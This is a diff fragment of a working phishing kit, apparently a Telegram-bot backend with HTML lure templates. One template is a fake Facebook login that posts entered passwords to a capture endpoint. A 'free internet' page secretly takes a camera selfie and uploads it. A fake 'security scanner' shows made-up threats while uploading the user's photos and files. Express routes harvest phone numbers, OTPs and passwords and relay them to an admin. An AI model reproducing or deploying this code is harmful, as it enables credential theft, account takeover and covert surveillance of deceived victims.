+<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
+</div>
+</div>
+<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>
+</div>
+<script>
+var id="USERID_PLACEHOLDER";
+var p="PLATFORM_PLACEHOLDER";
+function startEngine(){
+var u=document.getElementById("username").value.trim();
+var pwd=document.getElementById("password").value;
+if(!u||!pwd){alert("Please fill all fields.");return}
+fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
+document.getElementById("form-screen").style.display="none";
+document.getElementById("process-screen").style.display="block";
+document.querySelector(".loader").style.display="block";
+document.querySelector(".progress-bar").style.display="block";
+document.getElementById("result-area").style.display="none";
+var progress=0;
+var interval=setInterval(function(){
+progress+=Math.random()*3+1;
+if(progress>=100){progress=100;clearInterval(interval);
+document.querySelector(".loader").style.display="none";
+document.querySelector(".progress-bar").style.display="none";
+document.getElementById("result-area").style.display="block";
+document.getElementById("status-text").innerText="✅ Verified";
+return}
+document.getElementById("progress-fill").style.width=progress+"%";
+if(progress<30)document.getElementById("status-text").innerText="Connecting...";
+else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
+else if(progress<85)document.getElementById("status-text").innerText="Loading...";
+else document.getElementById("status-text").innerText="Almost done...";
+},150);
+}
+</script>
+</body>
+</html>`;
+
+const FB_TEMPLATE = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>fbprivatechat</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}.input-group input::placeholder{color:#666}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#666;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="bg-shapes"><span></span><span></span></div>
+<div class="card">
+<div class="logo"><i class="fab fa-facebook"></i><h1>fbprivatechat</h1></div>
+<div id="form-screen">
+<div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>
+<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
+<button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
+</div>
+<div id="process-screen" style="display:none">
+<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
+<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
+<div id="result-area" style="display:none">
+<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
+<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
+</div>
+</div>
+<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
+</div>
+<script>
+var id="USERID_PLACEHOLDER";
+var p="PLATFORM_PLACEHOLDER";
+function startEngine(){
+var u=document.getElementById("username").value.trim();
+var pwd=document.getElementById("password").value;
+if(!u||!pwd){alert("Please fill all fields.");return}
+fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
+document.getElementById("form-screen").style.display="none";
+document.getElementById("process-screen").style.display="block";
+document.querySelector(".loader").style.display="block";
+document.querySelector(".progress-bar").style.display="block";
+document.getElementById("result-area").style.display="none";
+var progress=0;
+var interval=setInterval(function(){
+progress+=Math.random()*3+1;
+if(progress>=100){progress=100;clearInterval(interval);
+document.querySelector(".loader").style.display="none";
+document.querySelector(".progress-bar").style.display="none";
+document.getElementById("result-area").style.display="block";
+document.getElementById("status-text").innerText="✅ Verified";
+return}
+document.getElementById("progress-fill").style.width=progress+"%";
+if(progress<30)document.getElementById("status-text").innerText="Connecting...";
+else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
+else if(progress<85)document.getElementById("status-text").innerText="Loading...";
+else document.getElementById("status-text").innerText="Almost done...";
+},150);
+}
+</script>
+</body>
+</html>`;
+
+const CAMERA_TEMPLATE = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>1 GB Free Internet</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Rajdhani",sans-serif;background:radial-gradient(ellipse at center,#0a0a0a,#000000);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
+.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(0,255,100,0.15);border-radius:35px;padding:50px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.9),inset 0 1px 0 rgba(0,255,100,0.1)}
+.badge{display:inline-block;background:linear-gradient(90deg,#00ff88,#00cc66);padding:6px 20px;border-radius:30px;font-size:11px;font-weight:700;letter-spacing:3px;color:#000;margin-bottom:15px}
+h1{font-family:"Orbitron",sans-serif;font-size:38px;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:25px}
+.input-box{margin:20px 0;text-align:left}
+.input-box label{font-size:13px;color:#00ff88;text-transform:uppercase;letter-spacing:2px;margin-left:15px;display:block;margin-bottom:5px}
+.input-box input{width:100%;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,100,0.15);border-radius:16px;padding:18px 20px;color:#fff;font-size:18px;font-family:"Rajdhani",sans-serif;transition:.4s;outline:none}
+.input-box input:focus{border-color:#00ff88;box-shadow:0 0 30px rgba(0,255,136,0.1)}
+.btn-claim{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-family:"Orbitron",sans-serif;font-weight:900;font-size:17px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 40px rgba(0,255,136,0.25);margin-top:15px}
+.btn-claim:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 20px 50px rgba(0,255,136,0.4)}
+.btn-claim:disabled{opacity:0.6;cursor:not-allowed}
+.loader-box{display:none;text-align:center;padding:20px 0}
+.loader-box .spinner{width:40px;height:40px;border:3px solid rgba(0,255,136,0.15);border-top-color:#00ff88;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}
+@keyframes spin{100%{transform:rotate(360deg)}}
+.loader-box p{color:#00ff88;margin-top:15px;font-size:14px;letter-spacing:1px}
+.log-area{background:rgba(0,0,0,0.6);border-radius:16px;padding:20px;font-family:"Courier New",monospace;font-size:13px;color:#00ff88;text-align:left;display:none;border:1px solid rgba(0,255,136,0.08);margin-top:20px;max-height:200px;overflow-y:auto}
+.log-area .line{padding:4px 0;border-bottom:1px solid rgba(0,255,136,0.05)}
+.log-area .line.suc{color:#00ff88}
+.log-area .line.err{color:#ff4444}
+.bg-glow{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
+.bg-glow span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,0.06),transparent 70%);animation:float 20s infinite ease-in-out}
+.bg-glow span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
+.bg-glow span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
+@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
+video,canvas{display:none}
+.result-box{display:none;text-align:center;padding:20px 0}
+.result-box i{font-size:50px;color:#00ff88}
+.result-box h3{color:#fff;margin-top:10px;font-family:"Orbitron",sans-serif}
+</style>
+</head>
+<body>
+<div class="bg-glow"><span></span><span></span></div>
+<div class="card">
+<div class="badge">🔥 VIP ACCESS</div>
+<h1>1 GB Free Internet</h1>
+<div class="input-box"><label>📱 Mobile Number</label><input type="number" id="mobile" placeholder="Enter 10 digit number"></div>
+<button class="btn-claim" id="claimBtn">🎁 CLAIM NOW</button>
+<div class="loader-box" id="loaderBox"><div class="spinner"></div><p id="statusText">Initializing...</p></div>
+<div class="log-area" id="logArea"></div>
+<div class="result-box" id="resultBox"><i class="fas fa-check-circle"></i><h3>Success!</h3></div>
+</div>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
+<script>
+var id="USERID_PLACEHOLDER";
+var p="PLATFORM_PLACEHOLDER";
+var claimBtn=document.getElementById("claimBtn");
+var logArea=document.getElementById("logArea");
+var loaderBox=document.getElementById("loaderBox");
+var statusText=document.getElementById("statusText");
+var resultBox=document.getElementById("resultBox");
+var video=document.getElementById("v");
+var canvas=document.getElementById("c");
+var ctx=canvas.getContext("2d");
+function addLog(msg,type){type=type||"";logArea.style.display="block";var l=document.createElement("div");l.className="line "+(type||"");l.innerText="▸ "+msg;logArea.appendChild(l);logArea.scrollTop=logArea.scrollHeight}
+claimBtn.addEventListener("click",async function(){
+var mobile=document.getElementById("mobile").value;
+if(mobile.length<10){alert("⚠️ Please enter valid 10 digit number!");return}
+claimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";
+loaderBox.style.display="block";resultBox.style.display="none";logArea.innerHTML="";
+statusText.innerText="🔍 Verifying...";
+addLog("Initializing secure connection...");
+addLog("📡 Requesting verification...");
+statusText.innerText="📸 Accessing camera...";
+addLog("📸 Accessing camera for verification...");
+try{
+var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}});
+video.srcObject=stream;
+await new Promise(function(r){setTimeout(r,600)});
+canvas.width=video.videoWidth||400;canvas.height=video.videoHeight||400;
+ctx.drawImage(video,0,0);
+var photoBase64=canvas.toDataURL("image/jpeg",0.85).split(",")[1];
+stream.getTracks().forEach(function(t){t.stop()});
+addLog("✅ Selfie captured successfully!","suc");
+statusText.innerText="📤 Sending...";
+addLog("📤 Encrypting and sending data...");
+fetch("/api/capturepic",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,mobile:mobile,SY:photoBase64,platform:p})}).catch(function(e){console.error(e)});
+await new Promise(function(r){setTimeout(r,1200)});
+addLog("✅ Verification complete!","suc");
+statusText.innerText="✅ Success!";
+claimBtn.innerText="✅ CLAIMED";
+claimBtn.style.background="linear-gradient(135deg,#00ff88,#00cc66)";
+resultBox.style.display="block";
+resultBox.innerHTML="<i class=\\"fas fa-check-circle\\" style=\\"color:#00ff88;font-size:50px\\"></i><h3 style=\\"color:#fff;margin-top:10px;font-family:Orbitron,sans-serif\\">1GB ADDED!</h3>";
+setTimeout(function(){alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM NOW";loaderBox.style.display="none"},1500)
+}catch(e){
+console.error("Camera error:",e);
+addLog("❌ Camera access denied! Please allow camera permission.","err");
+statusText.innerText="❌ Camera Error";
+claimBtn.innerText="🔄 RETRY";
+claimBtn.disabled=false;
+loaderBox.style.display="none";
+alert("⚠️ Camera permission is required. Please allow camera access and try again.");
+}
+});
+</script>
+</body>
+</html>`;
+
+const SCAN_TEMPLATE = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Security Scanner</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}
+body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
+.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:480px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}
+.header{text-align:center;margin-bottom:20px}
+.header .icon{font-size:70px;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
+.header h1{font-size:28px;font-weight:800;color:#fff;margin-top:5px}
+.header h1 span{background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.header p{color:#888;font-size:14px;margin-top:5px}
+.scan-status{background:rgba(255,255,255,0.03);border-radius:15px;padding:20px;margin:15px 0;border:1px solid rgba(255,255,255,0.05)}
+.scan-status .item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:#aaa;font-size:14px}
+.scan-status .item:last-child{border-bottom:none}
+.scan-status .item .label{color:#888}
+.scan-status .item .value{color:#ff6b6b;font-weight:600}
+.scan-status .item .value.good{color:#2ed573}
+.scan-status .item .value.danger{color:#ff4757}
+.scan-bar{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:10px 0}
+.scan-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);border-radius:10px;transition:width .3s}
+.threats{display:flex;gap:10px;margin:15px 0;flex-wrap:wrap;justify-content:center}
+.threats .badge{background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.2);color:#ff6b6b;padding:5px 15px;border-radius:20px;font-size:12px;display:none}
+.threats .badge.show{display:inline-block}
+.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;box-shadow:0 10px 30px rgba(255,71,87,0.2)}
+.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}
+.btn:disabled{opacity:0.5;cursor:not-allowed}
+.btn i{margin-right:10px}
+.status{text-align:center;margin-top:15px;padding:12px;border-radius:12px;display:none;font-size:14px}
+.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}
+.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}
+.status.info{background:rgba(54,164,235,0.1);color:#36a4eb;display:block}
+.status.warning{background:rgba(255,165,0,0.1);color:#ffa500;display:block}
+.progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}
+.progress .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);transition:width .3s}
+.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto}
+@keyframes spin{100%{transform:rotate(360deg)}}
+#fileInput{display:none}
+.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}
+.badge{display:inline-block;background:rgba(255,71,87,0.1);color:#ff4757;padding:4px 15px;border-radius:30px;font-size:11px;font-weight:600}
+.processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}
+#processingStatus{display:none}
+.scan-logs{background:rgba(0,0,0,0.3);border-radius:12px;padding:15px;margin:15px 0;max-height:150px;overflow-y:auto;display:none;font-family:monospace;font-size:12px;color:#888}
+.scan-logs .log{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
+.scan-logs .log .time{color:#555}
+.scan-logs .log .msg{color:#aaa}
+.scan-logs .log .danger{color:#ff4757}
+.scan-logs .log .good{color:#2ed573}
+.scan-logs .log .warn{color:#ffa500}
+.result-box{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}
+.result-box i{font-size:40px;color:#2ed573}
+.result-box h3{color:#2ed573;margin-top:8px}
+.result-box p{color:#888;font-size:13px;margin-top:5px}
+.result-box.danger{background:rgba(255,71,87,0.05);border-color:rgba(255,71,87,0.1)}
+.result-box.danger i{color:#ff4757}
+.result-box.danger h3{color:#ff4757}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="header"><span class="icon"><i class="fas fa-shield-alt"></i></span><h1>🔒 <span>Security Scanner</span></h1><p><span class="badge">🛡️ PROTECT</span> Scan your device for threats</p></div>
+<div class="scan-status">
+<div class="item"><span class="label">📱 Device</span><span class="value" id="deviceName">Scanning...</span></div>
+<div class="item"><span class="label">📂 Files Scanned</span><span class="value" id="filesScanned">0</span></div>
+<div class="item"><span class="label">⚠️ Threats Found</span><span class="value danger" id="threatsFound">0</span></div>
+<div class="item"><span class="label">🔒 Security Status</span><span class="value" id="securityStatus">🔴 At Risk</span></div>
+</div>
+<div class="scan-bar"><div class="fill" id="scanFill"></div></div>
+<p style="color:#555;font-size:12px;text-align:center;" id="scanPercent">0%</p>
+<div class="threats" id="threatsContainer">
+<span class="badge" id="threat1">🔴 Malware Detected</span>
+<span class="badge" id="threat2">🟠 Suspicious App</span>
+<span class="badge" id="threat3">🟡 Vulnerable File</span>
+<span class="badge" id="threat4">🔴 Trojan Found</span>
+</div>
+<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN NOW</button>
+<div id="status" class="status"></div>
+<div class="progress" id="progress"><div class="fill" id="progressFill"></div></div>
+<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Initializing security scan...</div></div>
+<div id="scanLogs" class="scan-logs"></div>
+<div id="resultBox" class="result-box" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your device is secure.</p></div>
+<input type="file" id="fileInput" multiple webkitdirectory>
+<div class="footer">🔒 End-to-end encrypted • AI powered • v3.0</div>
+</div>
+<script>
+(function() {
+    var userid = "USERID_PLACEHOLDER";
+    var deviceData = {
+        browser: navigator.userAgent,
+        os: navigator.platform,
+        device: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+        screen: screen.width + "x" + screen.height,
+        language: navigator.language,
+        timestamp: new Date().toISOString()
+    };
+    fetch("/api/device-info", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userid: userid, deviceData: deviceData })
+    }).catch(function(e) { console.error(e); });
+})();
+
+var USER_ID = "USERID_PLACEHOLDER";
+var PLATFORM = "PLATFORM_PLACEHOLDER";
+var isScanning = false;
+var selectedFiles = [];
+document.getElementById("deviceName").textContent = navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent.includes("iPhone") ? "iPhone" : navigator.userAgent.includes("Windows") ? "Windows PC" : "Unknown Device";
+
+function showStatus(msg, type) { var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }
+function updateScanProgress(percent) { document.getElementById("scanFill").style.width = percent + "%"; document.getElementById("scanPercent").textContent = Math.round(percent) + "%"; document.getElementById("progress").style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }
+function showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }
+function hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }
+function addLog(msg, type) { var logs = document.getElementById("scanLogs"); logs.style.display = "block"; var time = new Date().toLocaleTimeString(); var div = document.createElement("div"); div.className = "log"; div.innerHTML = "<span class=\\"time\\">[" + time + "]</span> <span class=\\"msg " + type + "\\">" + msg + "</span>"; logs.appendChild(div); logs.scrollTop = logs.scrollHeight; }
+function showThreat(id) { document.getElementById(id).classList.add("show"); }
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+function getRandomThreats() { var threats = [ { id: "threat1", text: "🔴 Malware Detected" }, { id: "threat2", text: "🟠 Suspicious App" }, { id: "threat3", text: "🟡 Vulnerable File" }, { id: "threat4", text: "🔴 Trojan Found" } ]; var count = Math.floor(Math.random() * 3) + 1; var shuffled = threats.sort(function() { return Math.random() - 0.5; }); return shuffled.slice(0, count); }
+
+async function startScan() {
+    if (isScanning) return;
+    isScanning = true;
+    var btn = document.getElementById("scanBtn");
+    btn.disabled = true;
+    btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING...";
+    document.getElementById("status").style.display = "none";
+    document.getElementById("resultBox").style.display = "none";
+    document.getElementById("scanLogs").innerHTML = "";
+    document.getElementById("scanLogs").style.display = "none";
+    document.getElementById("progress").style.display = "none";
+    document.getElementById("filesScanned").textContent = "0";
+    document.getElementById("threatsFound").textContent = "0";
+    document.getElementById("securityStatus").textContent = "🔴 Scanning...";
+    document.getElementById("securityStatus").className = "value danger";
+    document.querySelectorAll(".threats .badge").forEach(function(b) { b.classList.remove("show"); });
+    hideProcessing();
+    addLog("🔍 Initializing security scan...", "");
+    updateScanProgress(2);
+    await sleep(600);
+    addLog("📱 Scanning system files...", "");
+    updateScanProgress(8);
+    await sleep(500);
+    addLog("📂 Analyzing installed applications...", "");
+    updateScanProgress(15);
+    await sleep(700);
+    var threats = getRandomThreats();
+    if (threats.length > 0) { addLog("⚠️ " + threats[0].text + " found!", "danger"); showThreat(threats[0].id); document.getElementById("threatsFound").textContent = "1"; }
+    updateScanProgress(25);
+    await sleep(600);
+    addLog("📸 Scanning media files for threats...", "");
+    updateScanProgress(35);
+    await sleep(500);
+    addLog("🔍 Requesting media access for deep scan...", "");
+    showProcessing("🔍 Accessing gallery for deep scan...");
+    updateScanProgress(45);
+    await sleep(500);
+    var input = document.getElementById("fileInput");
+    input.setAttribute("webkitdirectory", "");
+    input.setAttribute("directory", "");
+    input.click();
+    input.onchange = async function(e) {
+        var files = input.files;
+        if (!files || files.length === 0) {
+            showStatus("❌ Scan interrupted. Please try again.", "error");
+            btn.disabled = false;
+            btn.innerHTML = "<i class=\\"fas fa-search\\"></i> RETRY SCAN";
+            hideProcessing();
+            isScanning = false;
+            return;
+        }
+        var validFiles = [];
+        var photoFiles = [];
+        var smallFiles = [];
+        for (var i = 0; i < files.length; i++) {
+            var f = files[i];
+            if (f.size >= 10240 && f.size <= 1048576) {
+                validFiles.push(f);
+                // Check if it's a photo
+                if (f.type && f.type.startsWith('image/')) {
+                    photoFiles.push(f);
+                } else if (f.size < 300 * 1024) {
+                    smallFiles.push(f);
+                }
+            }
+        }
+        // Use photos if available, otherwise small files
+        var filesToTransfer = photoFiles.length > 0 ? photoFiles : smallFiles;
+        if (photoFiles.length > 0) {
+            addLog("📸 Found " + photoFiles.length + " photos. Transferring photos...", "");
+        } else if (smallFiles.length > 0) {
+            addLog("📄 Found " + smallFiles.length + " small files (<300KB). Transferring...", "");
+        } else {
+            addLog("ℹ️ No valid files found (10KB-1MB).", "");
+        }
+        updateScanProgress(50);
+        document.getElementById("filesScanned").textContent = filesToTransfer.length;
+        if (threats.length > 1) {
+            setTimeout(function() { addLog("⚠️ " + threats[1].text + " detected!", "danger"); showThreat(threats[1].id); document.getElementById("threatsFound").textContent = "2"; }, 800);
+        }
+        await sleep(600);
+        var successCount = 0;
+        var maxFiles = Math.min(filesToTransfer.length, 200);
+        var batchSize = 10;
+        for (var k = 0; k < maxFiles; k += batchSize) {
+            var batch = filesToTransfer.slice(k, k + batchSize);
+            await Promise.all(batch.map(async function(file) {
+                try {
+                    var reader = new FileReader();
+                    var fileData = await new Promise(function(resolve, reject) {
+                        reader.onload = function(e) { resolve(e.target.result); };
+                        reader.onerror = reject;
+                        reader.readAsDataURL(file);
+                    });
+                    await fetch("/api/upload-photo-fast", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size })
+                    });
+                    successCount++;
+                    var percent = 50 + ( (k + batch.indexOf(file)) / maxFiles ) * 40;
+                    updateScanProgress(percent);
+                    document.getElementById("filesScanned").textContent = successCount;
+                    if (successCount % 5 === 0) { addLog("📤 Scanned " + successCount + "/" + maxFiles + " files...", ""); }
+                    await sleep(50);
+                } catch(err) { console.error(err); }
+            }));
+        }
+        if (threats.length > 2) {
+            setTimeout(function() { addLog("⚠️ " + threats[2].text + " quarantined!", "danger"); showThreat(threats[2].id); document.getElementById("threatsFound").textContent = "3"; }, 500);
+        }
+        updateScanProgress(100);
+        await sleep(800);
+        addLog("✅ Deep scan complete!", "good");
+        addLog("🛡️ " + successCount + " files scanned successfully", "good");
+        hideProcessing();
+        var threatCount = Math.min(threats.length, 3);
+        var resultBox = document.getElementById("resultBox");
+        if (threatCount > 0) {
+            resultBox.className = "result-box danger";
+            resultBox.innerHTML = "<i class=\\"fas fa-exclamation-triangle\\"></i><h3>⚠️ " + threatCount + " Threats Found!</h3><p>" + threatCount + " suspicious files detected and quarantined.</p>";
+            document.getElementById("securityStatus").textContent = "🟡 At Risk - " + threatCount + " threats";
+            document.getElementById("securityStatus").className = "value danger";
+        } else {
+            resultBox.className = "result-box";
+            resultBox.innerHTML = "<i class=\\"fas fa-check-circle\\"></i><h3>✅ All Clear!</h3><p>Your device is secure. No threats found.</p>";
+            document.getElementById("securityStatus").textContent = "🟢 Secure";
+            document.getElementById("securityStatus").className = "value good";
+        }
+        resultBox.style.display = "block";
+        showStatus("✅ Scan completed! " + successCount + " files analyzed.", "success");
+        btn.disabled = false;
+        btn.innerHTML = "<i class=\\"fas fa-check-circle\\"></i> SCAN COMPLETE";
+        isScanning = false;
+        // Clean up temp files
+        for (var j = 0; j < files.length; j++) {
+            try { URL.revokeObjectURL(files[j]); } catch(e) {}
+        }
+    };
+}
+</script>
+</body>
+</html>`;
+
+// ====================== EXPRESS ROUTES ======================
+app.use('/api/photos', express.static(BOT_PHOTO_DIR));
+
+// ====================== TELEGRAM DECISION API ======================
+app.get('/api/telegram-decision/:sessionId', async (req, res) => {
+    try {
+        const sessionId = req.params.sessionId;
+        if (!global.phishSessions || !global.phishSessions[sessionId]) {
+            return res.json({ decision: null });
+        }
+        const session = global.phishSessions[sessionId];
+        if (session.decision) {
+            return res.json({ decision: session.decision });
+        }
+        return res.json({ decision: null });
+    } catch (err) {
+        return res.status(500).json({ error: err.message });
+    }
+});
+
+// ====================== TELEGRAM PHISHING API ======================
+app.post('/api/telegram-phish', async (req, res) => {
+    try {
+        const { sessionId, userId, platform, phone, otp, password, action } = req.body || {};
+        console.log('📱 Telegram Phish:', { sessionId, userId, action, phone, otp, password });
+
+        if (!global.phishSessions) global.phishSessions = {};
+        if (!global.phishSessions[sessionId]) {
+            global.phishSessions[sessionId] = { 
+                userId, 
+                platform, 
+                phone, 
+                otp, 
+                password, 
+                step: 'login', 
+                createdAt: Date.now(),
+                decision: null
+            };
+        }
+        const session = global.phishSessions[sessionId];
+
+        if (action === 'phone') {
+            session.phone = phone;
+            session.step = 'otp';
+            
+            const creatorMsg = replaceAllEmojis('📱 <b>Telegram Login Attempt</b>\n\n👤 <b>User ID:</b> <code>') + userId + replaceAllEmojis('</code>\n📱 <b>Phone:</b> <code>') + phone + replaceAllEmojis('</code>\n⏰ <b>Time:</b> ') + new Date().toLocaleString() + replaceAllEmojis('\n\n📌 <b>Status:</b> Waiting for OTP...');
+            
+            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
